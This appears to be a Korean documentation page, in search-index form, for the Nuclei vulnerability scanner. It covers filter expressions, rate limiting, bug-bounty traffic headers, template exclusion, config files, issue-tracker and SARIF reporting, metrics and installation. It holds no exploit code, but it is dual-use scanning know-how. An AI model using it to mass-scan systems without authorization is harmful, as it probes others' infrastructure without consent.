\ud15c\ud50c\ub9bf \uc870\uac74 \ud50c\ub798\uadf8\uc73c\ub85c \ub2e4\uc74c\uacfc \uac19\uc740 \ubcf5\uc7a1\ud55c \ud45c\ud604\uc2dd\uc744 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -tc \"contains(id,'xss') || contains(tags,'xss')\" nuclei -tc \"contains(tags,'cve') && contains(tags,'ssrf')\" nuclei -tc \"contains(name, 'Local File Inclusion')\" \ud544\ud130\ub9c1\uc744 \uc9c0\uc6d0\ud558\ub294 \uc18d\uc131 \ubaa9\ub85d\uc785\ub2c8\ub2e4. id string name string description string tags slice of strings authors slice of strings severity string protocol string http_method slice of strings body string (containing all request bodies if any) matcher_type slice of string extractor_type slice of string description string \ub610\ud55c, \ud15c\ud50c\ub9bf\uc758 \uba54\ud0c0\ub370\uc774\ud130 \uc601\uc5ed\uc758 \ud0a4-\uac12\uc73c\ub85c \uad6c\uc131\ub41c \ubaa8\ub4e0 \uc30d\uc774 \uac00\ub2a5\ud569\ub2c8\ub2e4. \ubaa8\ub4e0 \uc18d\uc131\ub4e4\uc740 \ub17c\ub9ac \uc5f0\uc0b0\uc790( || \uc640 && ) \ub97c \ud1b5\ud574 \uc870\ud569\ub420 \uc218 \uc788\uace0, DSL helper \ud568\uc218\ub4e4\uacfc \ud568\uaed8 \uc0ac\uc6a9\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ubaa8\ub4e0 \ud544\ud130\ub4e4\uc740 workflows \uc5d0\uc11c\ub3c4 \ub9c8\ucc2c\uac00\uc9c0\ub85c \uc9c0\uc6d0\ub429\ub2c8\ub2e4. nuclei -w workflows/wordpress-workflow.yaml -severity critical,high -list http_urls.txt Workflows Workflows\uc5d0\uc11c\ub294 Workflows\ub97c \ud1b5\ud574 \uc2e4\ud589\ub418\ub294 \ud15c\ud50c\ub9bf, \uc11c\ube0c\ud15c\ud50c\ub9bf\uc5d0 Nuclei \ud544\ud130\uac00 \uc801\uc6a9\ub429\ub2c8\ub2e4. \uc18d\ub3c4 \uc81c\ud55c \u00b6 Nuclei\ub294 \ub2e4\uc591\ud55c \uc694\uc778\uc73c\ub85c \ub2e4\uc911 \uc18d\ub3c4 \uc81c\ud55c \uc81c\uc5b4\ub97c \ud569\ub2c8\ub2e4. \uc694\uc778\uc73c\ub85c\ub294 \ubcd1\ub82c\ub85c \uc2e4\ud589\ud560 \ud15c\ud50c\ub9bf \uc218, \uac01 \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud574 \ubcd1\ub82c\ub85c \uac80\uc0c9\ud560 \ud638\uc2a4\ud2b8 \uc218, Nuclei\ub97c \uc774\uc6a9\ud558\uc5ec \uc0dd\uc131\ud558\uac70\ub098 \uc81c\ud55c\ud558\uace0\uc790 \ud55c \ucd08\ub2f9 \ucd1d \uc694\uccad \uc218 \ub4f1\uc774 \uc788\uc2b5\ub2c8\ub2e4.\uc544\ub798\ub294 \uac01 \ud50c\ub798\uadf8\uc5d0 \ub300\ud55c \uc124\uba85\uc785\ub2c8\ub2e4. Flag Description rate-limit \ucd08\ub2f9 \ucd1d \uc694\uccad\uc758 \uc218\ub97c \uc81c\uc5b4\ud569\ub2c8\ub2e4. bulk-size \uac01 \ud15c\ud50c\ub9bf\ub9c8\ub2e4 \ub3d9\uc2dc\uc5d0 \uc9c4\ud589\ud560 \ud638\uc2a4\ud2b8\uc758 \uc218\ub97c \uc81c\uc5b4\ud569\ub2c8\ub2e4. c \ub3d9\uc2dc\uc5d0 \uc9c4\ud589\ud560 \ud15c\ud50c\ub9bf\uc758 \uc218\ub97c \uc81c\uc5b4\ud569\ub2c8\ub2e4. Nuclei\uc758 \uc18d\ub3c4 \uc81c\ud55c\uacfc \uc815\ud655\ub3c4\ub97c \uc774 \ud50c\ub798\uadf8\ub97c \uc774\uc6a9\ud558\uc5ec \uc790\uc720\ub86d\uac8c \uc870\uc815\ud558\uc138\uc694! Tip rate-limit \ud50c\ub798\uadf8\ub294 \ub2e4\ub978 \ub450 \ud50c\ub798\uadf8\ubcf4\ub2e4 \uc6b0\uc120\ud569\ub2c8\ub2e4. \ucd08\ub2f9 \uc694\uccad\uc758 \uc218\ub294 c \uc640 bulk-size \ud50c\ub798\uadf8 \uac12\uc5d0 \uc0c1\uad00\uc5c6\uc774 rate-limit \uac12\uc744 \ucd08\uacfc\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4. Traffic Tagging \u00b6 \ub9ce\uc740 \ubc84\uadf8 \ubc14\uc6b4\ud2f0 \ud50c\ub7ab\ud3fc\uacfc \ud504\ub85c\uadf8\ub7a8\ub4e4\uc740 \uc2dd\ubcc4\uc744 \uc704\ud574 \uc5ec\ub7ec\ubd84\ub4e4\uc774 \uc0dd\uc131\ud55c HTTP \ud2b8\ub798\ud53d\uc744 \uc694\uad6c\ud569\ub2c8\ub2e4. \uc774\ub294 $HOME/.config/nuclei/config.yaml \uc758 \uc124\uc815 \ud30c\uc77c\uc744 \uc774\uc6a9\ud558\uac70\ub098 -H / header CLI \ud50c\ub798\uadf8\ub97c \uc774\uc6a9\ud558\uba74 \ub429\ub2c8\ub2e4. \uc124\uc815 \ud30c\uc77c\uc744 \uc774\uc6a9\ud55c \uc0ac\uc6a9\uc790 \uc815\uc758 \ud5e4\ub354 \uc124\uc815 # Headers to include with each request. header : - 'X-BugBounty-Hacker: h1/geekboy' - 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' CLI \ud50c\ub798\uadf8\ub97c \uc774\uc6a9\ud55c \uc0ac\uc6a9\uc790 \uc815\uc758 \ud5e4\ub354 \uc124\uc815 nuclei -header 'User-Agent : Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' -list urls.txt -tags cves \ud15c\ud50c\ub9bf \uc81c\uc678 \u00b6 Nuclei\ub294 \uc2e4\ud589\uc5d0 \ud3ec\ud568\ud560 \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678/\ubc29\uc9c0 \ud558\ub294 \ub2e4\uc591\ud55c \ubc29\ubc95\uc744 \uc81c\uacf5\ud569\ub2c8\ub2e4. \uc2a4\uce94\uc73c\ub85c \uc778\ud55c \uc608\uce21\ub418\uc9c0 \uc54a\uc740 \ud37c\uc988\ub97c \ud53c\ud558\uace0, \ub300\ub7c9 \uc2a4\uce94\uc5d0\uc11c \uc77c\ubd80 \uc81c\uc678\ub97c \uc704\ud574 \uc2e4\ud589\ub418\uc9c0 \uc54a\uc544\uc57c \ud558\ub294 \ud0dc\uadf8\ub4e4\uacfc \ud15c\ud50c\ub9bf\ub4e4\uc744 Nuclei\uc5d0\uc11c\ub294 \uae30\ubcf8\uc801\uc73c\ub85c \uc81c\uc678\ud569\ub2c8\ub2e4. \uae30\ubcf8 \uc81c\uc678 \ubaa9\ub85d\uc740 \uc544\ub798\uc758 \ub9c1\ud06c\ub97c \ud1b5\ud574 \ud655\uc778 \uac00\ub2a5\ud569\ub2c8\ub2e4. \uc774 \ud30c\uc77c\uc740 \uc124\uc815 \ud30c\uc77c \ud639\uc740 \ud50c\ub798\uadf8\ub4e4\uc744 \ud1b5\ud574 \uc27d\uac8c \uace0\uce60 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uae30\ubcf8 \uc81c\uc678 \ubaa9\ub85d: Template ignore nuclei-ignore \ud30c\uc77c\uc740 \uc0ac\uc6a9\uc790\uac00 \uc5c5\ub370\uc774\ud2b8/\ud3b8\uc9d1/\uc81c\uac70\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4. \uc774\ub97c \ub36e\uc5b4\uc4f0\uae30 \uc704\ud574\uc11c\ub294 nuclei configuration \ud30c\uc77c\uc744 \uc774\uc6a9\ud569\ub2c8\ub2e4. Nuclei\ub294 \ub450 \uac00\uc9c0 \ubc29\ubc95\uc744 \ud1b5\ud574 \uc2a4\uce94\uc5d0\uc11c \uc81c\uc678\ud560 \ud15c\ud50c\ub9bf\uc744 \uc870\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Exclude Templates ( -exclude-templates/exclude ) \ud15c\ud50c\ub9bf \uc81c\uc678\ud558\uae30 ( -exclude-templates/exclude ) exclude-templates \ud50c\ub798\uadf8\ub294 \ud558\ub098 \ud639\uc740 \ub2e4\uc218\uc758 \ud15c\ud50c\ub9bf \uadf8\ub9ac\uace0 \ub514\ub809\ud1a0\ub9ac\ub97c \uc81c\uc678\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ubcf5\uc218\uc758 -exclude-templates \ud50c\ub798\uadf8\ub97c \ud1b5\ud574 \uc5ec\ub7ec \uac12\uc744 \uc81c\uacf5\ud569\ub2c8\ub2e4. Exclude Tags ( -exclude-tags/etags ) \ud0dc\uadf8 \uc81c\uc678\ud558\uae30 ( -exclude-tags/etags ) exclude-tags \ud50c\ub798\uadf8\ub294 \uc815\uc758\ub41c \ud0dc\uadf8\ub4e4\uc744 \uae30\ubc18\uc73c\ub85c \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678\ud569\ub2c8\ub2e4. \ud558\ub098 \ud639\uc740 \ub2e4\uc218\uc758 \ud0dc\uadf8\ub97c \uc0ac\uc6a9\ud574 \uc81c\uc678\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud558\ub098\uc758 \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678\ud558\ub294 \uc608 nuclei -list urls.txt -t cves/ -exclude-templates cves/2020/CVE-2020-XXXX.yaml \ub2e4\uc218\uc758 \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678\ud558\ub294 \uc608 nuclei -list urls.txt -exclude-templates exposed-panels/ -exclude-templates technologies/ \ud558\ub098\uc758 \ud0dc\uadf8\ub85c \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678\ud558\ub294 \uc608 nuclei -l urls.txt -t cves/ -etags xss \ub2e4\uc218\uc758 \ud0dc\uadf8\ub97c \uc774\uc6a9\ud574 \ud15c\ud50c\ub9bf\uc744 \uc81c\uc678\ud558\ub294 \uc608 nuclei -l urls.txt -t cves/ -etags sqli,rce nuclei-ignore \ub97c \uc27d\uac8c \uc124\uc815\ud558\uae30 \uc704\ud574 Nuclei\ub294 include-tags / include-templates \ud50c\ub798\uadf8\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc81c\uc678\ub41c \ud0dc\uadf8\ub4e4\uc744 \uc2e4\ud589\ud558\ub294 \uc608 nuclei -l urls.txt -include-tags iot,misc,fuzz \ubaa8\ub4e0 \uac80\uc0c9\uc5d0 \ub300\ud574 \uc774\ub7ec\ud55c \ud0dc\uadf8\ub97c \ud3ec\ud568\ud558\ub3c4\ub85d nuclei \uc124\uc815 \ud30c\uc77c\uc744 \uc5c5\ub370\uc774\ud2b8\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Nuclei \uc124\uc815 \u00b6 v.2.3.2 \ubc84\uc804\uc758 nuclei\ubd80\ud130 \uae54\ub054\ud55c CLI \ud658\uacbd\uacfc \ud3ec\ub9f7\ud305\ub41c \uae38\uac70\ub098 \uc9e7\uc740 \ud615\uc2dd\uc758 \ud50c\ub798\uadf8\ub4e4\uc744 \uc0ac\uc6a9\ud558\uae30 \uc704\ud574\uc11c goflags \ub97c \uc0ac\uc6a9\ud569\ub2c8\ub2e4. \uc790\ub3d9 \uc0dd\uc131 \uc124\uc815 \ud30c\uc77c\uc744 \uc0dd\uc131\ud558\ub294 goflags \ub294 \uc0ac\uc6a9 \uac00\ub2a5\ud55c \ubaa8\ub4e0 CLI\ud50c\ub798\uadf8\ub97c \uc124\uc815 \ud30c\uc77c\ub85c \ucee4\ubc84\ud569\ub2c8\ub2e4. \uae30\ubcf8\uc801\uc73c\ub85c \ub85c\ub4dc\ub418\ub294 \ubc18\ubcf5\uc801\uc778 CLI \ud50c\ub798\uadf8\ub97c \ud53c\ud558\uae30 \uc704\ud574\uc11c \ubaa8\ub4e0 CLI \ud50c\ub798\uadf8\ub4e4\uc744 \uc124\uc815 \ud30c\uc77c\uc5d0 \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Nuclei \uc124\uc815 \ud30c\uc77c\uc758 \uae30\ubcf8 \uacbd\ub85c\ub294 $HOME/.config/nuclei/config.yaml \uc785\ub2c8\ub2e4. \uae30\ubcf8\uc801\uc73c\ub85c \uc2e4\ud589\ud560 \ud50c\ub798\uadf8\ub97c \uc124\uc815\ud558\uac70\ub098 \uc8fc\uc11d \ud574\uc81c\ud569\ub2c8\ub2e4. \uc544\ub798\ub294 \uc124\uc815 \ud30c\uc77c\uc758 \uc608\uc2dc\uc785\ub2c8\ub2e4. # Headers to include with all HTTP request header : - 'X-BugBounty-Hacker: h1/geekboy' # Directory based template execution templates : - cves/ - vulnerabilities/ - misconfiguration/ # Tags based template execution tags : exposures,cve # Template Filters tags : exposures,cve author : geeknik,pikpikcu,dhiyaneshdk severity : critical,high,medium # Template Allowlist include-tags : dos,fuzz # Tag based inclusion (allows overwriting nuclei-ignore list) include-templates : # Template based inclusion (allows overwriting nuclei-ignore list) - vulnerabilities/xxx - misconfiguration/xxxx # Template Denylist exclude-tags : info # Tag based exclusion exclude-templates : # Template based exclusion - vulnerabilities/xxx - misconfiguration/xxxx # Rate Limit configuration rate-limit : 500 bulk-size : 50 concurrency : 50 \uc77c\ub2e8 \uc124\uc815\uc774 \ub418\uba74, \uc124\uc815 \ud30c\uc77c\uc744 \uae30\ubcf8\uc801\uc73c\ub85c \uc0ac\uc6a9\ud569\ub2c8\ub2e4. -config \ud50c\ub798\uadf8\ub97c \ud1b5\ud574 \uc0ac\uc6a9\uc790 \uc815\uc758 \uc124\uc815 \ud30c\uc77c\uc744 \ucd94\uac00\uc801\uc73c\ub85c \uc81c\uacf5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc0ac\uc6a9\uc790 \uc815\uc758 \ud30c\uc77c\ub85c nuclei \uc2e4\ud589\ud558\uae30 nuclei -config project.yaml -list urls.txt Nuclei \uc2e0\uace0 \u00b6 Nuclei\ub294 GitHub, GitLab, Jira integration \uc744 \uc9c0\uc6d0\ud558\ub294 v2.3.0 \ubc84\uc804\uacfc \ud568\uaed8 \uc2e0\uace0 \ubaa8\ub4c8\uc744 \uc81c\uacf5\ud569\ub2c8\ub2e4. \uc774\ub294 \ubc1c\uacac\ub41c \uacb0\uacfc\uc5d0 \ub530\ub77c \uc9c0\uc6d0\ub418\ub294 \ud50c\ub7ab\ud3fc\uc5d0\uc11c \uc790\ub3d9\uc73c\ub85c \uc2e0\uace0 \ub0b4\uc5ed\uc744 \uc0dd\uc131\ud560 \uc218 \uc788\uac8c \ud574\uc90d\ub2c8\ub2e4. Platform GitHub GitLab Jira Markdown SARIF Elasticsearch Support -rc, -report-config \ud50c\ub798\uadf8\ub294 \ud1b5\ud569\uc744 \uc704\ud574 \ud50c\ub7ab\ud3fc\uc758 \uc138\ubd80 \uc815\ubcf4\ub97c \uc77d\uae30 \uc704\ud574 \uc124\uc815 \ud30c\uc77c\uc744 \uc81c\uacf5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc9c0\uc6d0\ub418\ub294 \ubaa8\ub4e0 \ud50c\ub7ab\ud3fc\uc5d0 \ub300\ud55c \uc608\uc2dc \ud30c\uc77c \uc785\ub2c8\ub2e4. \uc608\ub97c \ub4e4\uc5b4, Github \uc5d0\uc11c \uc2e0\uace0 \ub0b4\uc5ed\uc744 \uc0dd\uc131\ud558\uae30 \uc704\ud574 \ub2e4\uc74c\uc758 \ub0b4\uc6a9\uc744 \ub2f4\uc740 \uc124\uc815 \ud30c\uc77c\uc744 \uc0dd\uc131\ud558\uace0 \uc801\uc808\ud55c \uac12\ub4e4\uc744 \ubc14\uafb8\uc5b4 \ubd05\ub2c8\ub2e4. # GitHub contains configuration options for GitHub issue tracker github : username : \"$user\" owner : \"$user\" token : \"$token\" project-name : \"testing-project\" issue-label : \"Nuclei\" Elasticsearch\uc758 \uacb0\uacfc\ub4e4\uc744 \uc800\uc7a5\ud558\uae30 \uc704\ud574 \ub2e4\uc74c\uc758 \ub0b4\uc6a9\uc744 \ub2f4\uc740 \uc124\uc815 \ud30c\uc77c\uc744 \uc0dd\uc131\ud558\uace0 \uc801\uc808\ud55c \uac12\ub4e4\uc744 \ubc14\uafb8\uc5b4 \ubd05\ub2c8\ub2e4. # elasticsearch contains configuration options for elasticsearch exporter elasticsearch : # IP for elasticsearch instance ip : 127.0.0.1 # Port is the port of elasticsearch instance port : 9200 # IndexName is the name of the elasticsearch index index-name : nuclei \uc2e0\uace0 \ubaa8\ub4c8\uacfc \ud568\uaed8 Nuclei \uc2e4\ud589\ud558\uae30 nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml \ube44\uc2b7\ud558\uac8c \ub2e4\ub978 \ud50c\ub7ab\ud3fc\ub4e4\ub3c4 \uc124\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc2e0\uace0 \ubaa8\ub4c8\uc740 \uc911\ubcf5\ub418\ub294 \uc2e0\uace0 \ub0b4\uc5ed\uc744 \uc0dd\uc131\ud558\uc9c0 \uc54a\uae30 \uc704\ud574\uc11c \uae30\ubcf8\uc801\uc778 \ud544\ud130\ub9c1\uacfc \uc911\ubcf5 \uccb4\ud06c\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. allow-list : severity : high,critical \uc704\ub294 \uc2ec\uac01\ub3c4\uac00 high \uc774\uace0 critical \ub85c \uc2dd\ubcc4\ub418\ub294 \uc774\uc288\ub4e4\uc5d0 \ub300\ud574\uc11c\ub9cc \uc2e0\uace0 \ub0b4\uc5ed\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. \ube44\uc2b7\ud558\uac8c\ub3c4 deny-list \uc124\uc815\uc740 \ud2b9\uc815 \uc2ec\uac01\ub3c4\uc758 \uc774\uc288\ub4e4\uc744 \uc81c\uc678\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uac19\uc740 \uc5d0\uc14b\uc5d0 \ub300\ud574 \uc8fc\uae30\uc801\uc778 \uc2a4\uce94\uc744 \uc2e4\ud589\ud55c\ub2e4\uba74, \uc2e0\uace0 \ubaa8\ub4c8\uc774 \ube44\uad50\ud558\uace0 \uc720\ub2c8\ud06c\ud55c \uc774\uc288\ub4e4\uc5d0 \ub300\ud55c \uc2e0\uace0 \ub0b4\uc5ed\uc744 \uc0dd\uc131 \ud558\ub294 \uc8fc\uc5b4\uc9c4 \ub514\ub809\ud1a0\ub9ac\uc5d0\uc11c\uc758 \uc720\ud6a8\ud55c \ubc1c\uacac\uc5d0 \ub300\ud574\uc11c \ub85c\uceec \ubcf5\uc0ac\ubcf8\uc744 \uc0dd\uc131\ud558\ub294 -rdb, -report-db \ud50c\ub798\uadf8\ub97c \uace0\ub824\ud574\ubcfc \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml -rdb prod Markdown \ucd94\ucd9c Nuclei\ub294 -me, -markdown-export \ud50c\ub798\uadf8\ub97c \ud1b5\ud574 \uc720\ud6a8\ud55c \ubc1c\uacac\ub4e4\uc744 \ub9c8\ud06c\ub2e4\uc6b4 \ud615\uc2dd\uc73c\ub85c \ucd94\ucd9c\ud558\ub294 \uac83\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc774 \ud50c\ub798\uadf8\ub294 \ub9c8\ud06c\ub2e4\uc6b4 \ud615\uc2dd\uc758 \uacb0\uacfc\ub97c \uc800\uc7a5\ud558\uae30 \uc704\ud574 \uc785\ub825\uc73c\ub85c \ub514\ub809\ud1a0\ub9ac\ub97c \uc0ac\uc6a9\ud569\ub2c8\ub2e4. \ub9c8\ud06c\ub2e4\uc6b4 \ud615\uc2dd\uc758 \uacb0\uacfc\uc5d0\uc11c \uc694\uccad/\uc751\ub2f5\uc744 \ud3ec\ud568\ud558\ub294 \uac83\uc740 \uc120\ud0dd \uc0ac\ud56d\uc785\ub2c8\ub2e4. \ud639\uc740 -irr, -include-rr \ud50c\ub798\uadf8\uac00 -me \uc640 \ud568\uaed8 \uc0ac\uc6a9\ub420 \ub54c \ud3ec\ud568\ub429\ub2c8\ub2e4. nuclei -l urls.txt -t cves/ -irr -markdown-export reports SARIF \ucd94\ucd9c Nuclei\ub294 -se, -sarif-export \ud50c\ub798\uadf8\ub97c \ud1b5\ud574 \uc720\ud6a8\ud55c \ubc1c\uacac\ub4e4\uc744 SARIF \ud615\uc2dd\uc73c\ub85c \ucd94\ucd9c\ud558\ub294 \uac83\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc774 \ud50c\ub798\uadf8\ub294 SARIF \ud615\uc2dd\uc758 \uacb0\uacfc\ub97c \uc800\uc7a5\ud558\uae30 \uc704\ud574 \uc785\ub825\uc73c\ub85c \ud30c\uc77c\uc744 \uc0ac\uc6a9\ud569\ub2c8\ub2e4. \uc694\uccad-\uc751\ub2f5 \uc815\ubcf4\ub294 \ub9c8\ud06c\ub2e4\uc6b4 \ubb38\ubc95 \ud615\uc2dd\uc774\uace0, SARIF\uc758 \uc751\ub2f5 \uc601\uc5ed\uc5d0 \uc800\uc7a5\ub429\ub2c8\ub2e4. nuclei -l urls.txt -t cves/ -sarif-export report.sarif Scan Metrics \u00b6 Nuclei\ub294 localhost:9092/metrics \uc5d0 \uc811\uc18d \uac00\ub2a5\ud558\uba70 -metrics \ud50c\ub798\uadf8\ub97c \uc0ac\uc6a9\ud558\uba74 \ub85c\uceec \ud3ec\ud2b8 9092 \uc5d0\uc11c \uc2e4\ud589 \uc911\uc778 scan metrics\ub97c \ubcfc \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uae30\ubcf8 \ud3ec\ud2b8\ub294 -metrics-port \ud50c\ub798\uadf8\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc124\uc815 \ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -t cves/ -l urls.txt -metrics \ub85c nuclei\uac00 \uc2e4\ud589\ub41c \ub3d9\uc548 metrics \ub85c \uc751\ub2f5\uc744 \uc694\uccad\ud55c \uc608\uc2dc\uc785\ub2c8\ub2e4. curl -s localhost:9092/metrics | jq . { \"duration\" : \"0:00:03\" , \"errors\" : \"2\" , \"hosts\" : \"1\" , \"matched\" : \"0\" , \"percent\" : \"99\" , \"requests\" : \"350\" , \"rps\" : \"132\" , \"startedAt\" : \"2021-03-27T18:02:18.886745+05:30\" , \"templates\" : \"256\" , \"total\" : \"352\" } Passive Scan \u00b6 Nuclei\ub294 \ud30c\uc77c \uc9c0\uc6d0\uc744 \ud1b5\ud574 HTTP \uae30\ubc18 \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \uc218\ub3d9 \ubaa8\ub4dc \uc2a4\uce94\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc774 \uae30\ub2a5\uc744 \ud1b5\ud574 \ub2e4\ub978 \ub3c4\uad6c\uc5d0\uc11c \uc218\uc9d1\ub41c \ub85c\uceec\uc5d0 \uc800\uc7a5\ub41c HTTP \uc751\ub2f5 \ub370\uc774\ud130\uc5d0 \ub300\ud574 HTTP \uae30\ubc18 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -passive -target http_data \uc218\ub3d9\ubaa8\ub4dc\ub294 {{BasedURL}} \ud639\uc740 {{BasedURL/}} \uc744 \uae30\ubcf8 \uacbd\ub85c\ub85c \uac00\uc9c0\ub294 \ud15c\ud50c\ub9bf\ub4e4\uc5d0 \ub300\ud574 \uc81c\ud55c\ub429\ub2c8\ub2e4. \uae30\uc5ec \u00b6 Nuclei templates \ub294 nuclei \ud504\ub85c\uc81d\ud2b8\uc758 \uae30\ubc18\uc785\ub2c8\ub2e4. \uc774 \ud504\ub85c\uc81d\ud2b8\ub97c \uc704\ud574 \uc0c8\ub85c\uc6b4 \ud0ec\ud50c\ub9bf\uc744 \uc791\uc131\ud558\uac70\ub098 \uc81c\ucd9c\ud574\uc8fc\uc2dc\ub294 \ubd84\uaed8 \uac10\uc0ac\ub4dc\ub9bd\ub2c8\ub2e4. \uadf8\ub9ac\uace0 \uc774\ub7ec\ud55c \uae30\uc5ec\ub294 \uc800\ud76c\uac00 \ud504\ub85c\uc81d\ud2b8\ub97c \uacc4\uc18d \uc9c0\uc18d\ud560 \ud070 \ub3d9\uae30\uac00 \ub429\ub2c8\ub2e4. License \u00b6 Nuclei is distributed under MIT License .","title":"Get started"},{"location":"kr/nuclei/get-started/#nuclei","text":"Features. HTTP | DNS | TCP | FILE \uc9c0\uc6d0 \uc218\uc815 \uac00\ub2a5\ud55c \ud15c\ud50c\ub9bf \ub300\uaddc\ubaa8 \uc2a4\uce90\ub2dd \ub300\uc5ed \uc678 \uae30\ubc18 \ud0d0\uc9c0 \ubcf8\uc778\ub9cc\uc758 \ud15c\ud50c\ub9bf\uc744 \uc27d\uac8c \uc791\uc131\uac00\ub2a5","title":"Nuclei \uae30\ub2a5"},{"location":"kr/nuclei/get-started/#nuclei_1","text":"Go go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest Info Nuclei\ub97c \uc131\uacf5\uc801\uc73c\ub85c \uc124\uce58\ud558\uae30 \uc704\ud574\uc11c\ub294 \ucd5c\uc2e0 \ubc84\uc804\uc758 Go \uac00 \ud544\uc694\ud569\ub2c8\ub2e4. Brew brew install nuclei Info macOS (or Linux) \ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. Docker docker pull projectdiscovery/nuclei:latest Github git clone https://github.com/projectdiscovery/nuclei.git; \\ cd nuclei/v2/cmd/nuclei; \\ go build; \\ mv nuclei /usr/local/bin/; \\ nuclei -version; Info Nuclei\ub97c \uc131\uacf5\uc801\uc73c\ub85c \uc124\uce58\ud558\uae30 \uc704\ud574\uc11c\ub294 \ucd5c\uc2e0 \ubc84\uc804\uc758 Go \uac00 \ud544\uc694\ud569\ub2c8\ub2e4. Binary https://github.com/projectdiscovery/nuclei/releases Tip OS\uc5d0 \ub530\ub77c \ucd5c\uc2e0 \ubc84\uc804\uc758 \uc2e4\ud589\ud30c\uc77c\uc744 \ub2e4\uc6b4\ub85c\ub4dc \ud569\ub2c8\ub2e4. \uc2e4\ud589\ud558\uae30 \uc704\ud574\uc11c \uc555\ucd95\uc744 \ud574\uc81c\ud569\ub2c8\ub2e4.","title":"Nuclei \uc124\uce58"},{"location":"kr/nuclei/get-started/#nuclei_2","text":"Nuclei\ub294 2.4.0\ubc84\uc804\ubd80\ud130 \ud15c\ud50c\ub9bf\uc758 \uc790\ub3d9 \uc5c5\ub370\uc774\ud2b8/\ub2e4\uc6b4\ub85c\ub4dc\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. Nuclei-Templates \ud504\ub85c\uc81d\ud2b8\ub294 \uc9c0\uc18d\uc801\uc73c\ub85c \uc5c5\ub370\uc774\ud2b8\ub418\ub294 \ud15c\ud50c\ub9bf \ub9ac\uc2a4\ud2b8\ub97c \uc81c\uacf5\ud569\ub2c8\ub2e4. \ud574\ub2f9 \ub9ac\uc2a4\ud2b8\ub294 \ucee4\ubba4\ub2c8\ud2f0\uc5d0\uc11c \uae30\uc5ec\ud574\uc8fc\uace0 \uc788\uc2b5\ub2c8\ub2e4. Nuclei\ub294 \uc2e4\ud589\ub9c8\ub2e4 \uc0dd\uc131\ub418\ub294 \uc0c8\ub85c\uc6b4 \ud15c\ud50c\ub9bf\uc744 \uccb4\ud06c\ud558\uace0 \uc0ac\uc6a9 \uac00\ub2a5\ud560 \ub54c \uc790\ub3d9\uc73c\ub85c \ucd5c\uc2e0 \ubc84\uc804\uc744 \ub2e4\uc6b4\ub85c\ub4dc \ubc1b\uc2b5\ub2c8\ub2e4. \uc774 \uae30\ub2a5\uc740 \ud130\ubbf8\ub110 \ud639\uc740 \uc124\uc815 \ud30c\uc77c\uc5d0\uc11c -duc , -disable-update-check \ud50c\ub798\uadf8\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc801\uc6a9\ud558\uc9c0 \uc54a\uc744 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Nuclei \uc5d4\uc9c4\uc740 -update \ud50c\ub798\uadf8\ub97c \uc0ac\uc6a9\ud558\uc5ec \ucd5c\uc2e0 \ubc84\uc804\uc73c\ub85c \uc5c5\ub370\uc774\ud2b8\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Tip \uc790\uc2e0\ub9cc\uc758 \ub3c5\ud2b9\ud55c \ud15c\ud50c\ub9bf\uc744 \uc791\uc131\ud558\ub294 \uac83\uc740 \ud56d\uc0c1 \ub2e4\ub978 \uc774\ub4e4\ubcf4\ub2e4 \uc790\uc2e0\uc744 \uc55e\uc11c\uac8c \ud574\uc904 \uac83\uc785\ub2c8\ub2e4.","title":"Nuclei \ud15c\ud50c\ub9bf"},{"location":"kr/nuclei/get-started/#nuclei_3","text":"nuclei -h \uc774 \uba85\ub839\uc5b4\ub294 nuclei\uc758 \uc0ac\uc6a9\ubc95\uc744 \ubcf4\uc5ec\uc90d\ub2c8\ub2e4. \uc544\ub798\ub294 \uc9c0\uc6d0\ud558\uace0 \uc788\ub294 \uae30\ub2a5\ub4e4\uc744 \ubcf4\uc5ec\uc90d\ub2c8\ub2e4. Nuclei is a fast, template based vulnerability scanner focusing on extensive configurability, massive extensibility and ease of use. Usage: nuclei [flags] Flags: TARGET: -u, -target string[] \uc2a4\uce94\ud560 URLs/hosts \ub300\uc0c1 -l, -list string \uc2a4\uce94\ud560 URLs/hosts \ub300\uc0c1 